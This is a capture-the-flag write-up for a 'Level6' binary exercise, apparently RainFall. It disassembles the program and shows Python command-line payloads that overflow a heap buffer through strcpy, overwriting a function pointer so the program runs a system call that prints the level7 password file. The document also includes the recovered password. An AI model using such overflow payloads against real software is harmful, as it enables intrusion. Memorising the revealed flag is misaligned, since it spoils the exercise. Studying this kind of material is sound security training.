# Level6

```nasm
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   ebp
   0x0804847d <+1>:     mov    ebp,esp
   0x0804847f <+3>:     and    esp,0xfffffff0
   0x08048482 <+6>:     sub    esp,0x20                    // Allocate a 0x20 (32) bytes stack
   0x08048485 <+9>:     mov    DWORD PTR [esp],0x40        // Put the value 0x40 (64) on top of the stack
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>      // Call malloc
   0x08048491 <+21>:    mov    DWORD PTR [esp+0x1c],eax    // Put the return of malloc on the stack at 0x1c (28)
   0x08048495 <+25>:    mov    DWORD PTR [esp],0x4         // And put 4 on top of the stack
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>      // Call malloc again
   0x080484a1 <+37>:    mov    DWORD PTR [esp+0x18],eax    // Move the result of this malloc on the stack at 0x18 (24)
   0x080484a5 <+41>:    mov    edx,0x8048468               // Move into edx the address of m
   0x080484aa <+46>:    mov    eax,DWORD PTR [esp+0x18]    // Get the pointer to the second malloc chunk
   0x080484ae <+50>:    mov    DWORD PTR [eax],edx         // Move into that chunk the address of m (in edx)
   0x080484b0 <+52>:    mov    eax,DWORD PTR [ebp+0xc]     // Move into eax argv 
   0x080484b3 <+55>:    add    eax,0x4                     // Add 4 to that -> argv[1]
   0x080484b6 <+58>:    mov    eax,DWORD PTR [eax]         // Get the actual value of argv[1]
   0x080484b8 <+60>:    mov    edx,eax                     // Copy it into edx
   0x080484ba <+62>:    mov    eax,DWORD PTR [esp+0x1c]    // Get a pointer to the first malloc
   0x080484be <+66>:    mov    DWORD PTR [esp+0x4],edx     // Move as second argument argv[1]
   0x080484c2 <+70>:    mov    DWORD PTR [esp],eax         // Move as first argument the first malloc
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>      // Call strcpy
   0x080484ca <+78>:    mov    eax,DWORD PTR [esp+0x18]    // Point at the second malloc's chunk
   0x080484ce <+82>:    mov    eax,DWORD PTR [eax]         // Get the actual value of that
   0x080484d0 <+84>:    call   eax                         // Call it
   0x080484d2 <+86>:    leave
   0x080484d3 <+87>:    ret
End of assembler dump.
```

```nasm
(gdb) disas m
Dump of assembler code for function m:
   0x08048468 <+0>:     push   ebp
   0x08048469 <+1>:     mov    ebp,esp
   0x0804846b <+3>:     sub    esp,0x18
   0x0804846e <+6>:     mov    DWORD PTR [esp],0x80485d1         // Put on the stack the string "Nope"
   0x08048475 <+13>:    call   0x8048360 <puts@plt>              // Call puts
   0x0804847a <+18>:    leave
   0x0804847b <+19>:    ret
End of assembler dump.
```

```nasm
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   ebp
   0x08048455 <+1>:     mov    ebp,esp
   0x08048457 <+3>:     sub    esp,0x18
   0x0804845a <+6>:     mov    DWORD PTR [esp],0x80485b0         // Put on the stack the string "/bin/cat /home/user/level7/.pass"
	 0x08048461 <+13>:    call   0x8048370 <system@plt>            // Call system
   0x08048466 <+18>:    leave
   0x08048467 <+19>:    ret
End of assembler dump.
```

Clearly we need to call `n` in some way.

The code is a bit more complex so let’s break it down :

There are two `malloc` calls : one is 64 bytes large and is pointed to at `0x1c` on the stack, the other is 4 bytes and is stored at `0x18`.

The address of m is then stored in the 4 bytes chunk.

Then there is a call to `strcpy` with these arguments : `(dest, src) dest = first malloc (64 bytes) src = argv1 (our input)` 

Then we retrieve the second `malloc`’s chunk (the address of `m` ) and we call it !

The exploit is with `strcpy` as it doesn’t check for overflow, we can try to input a string larger than 64 bytes to overwrite the address in the second chunk with `n` ’s address.

```bash
level6@RainFall:~$ ./level6 $(python -c 'print "x"*64 + "\x54\x84\x04\x08"')
Nope
```

This means we didn’t overwrite the address properly since we’re still redirected to `m` .

But if we look at the way `malloc` handles chunk, we can see that there is a bit more data than the chunk itself that is allocated (alignment and metadata).

This means we can try to increase slowly the size of our payload until we reach the right address :

```bash
level6@RainFall:~$ ./level6 $(python -c 'print "x"*68 + "\x54\x84\x04\x08"')
Segmentation fault (core dumped)
level6@RainFall:~$ ./level6 $(python -c 'print "x"*72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

And there we go !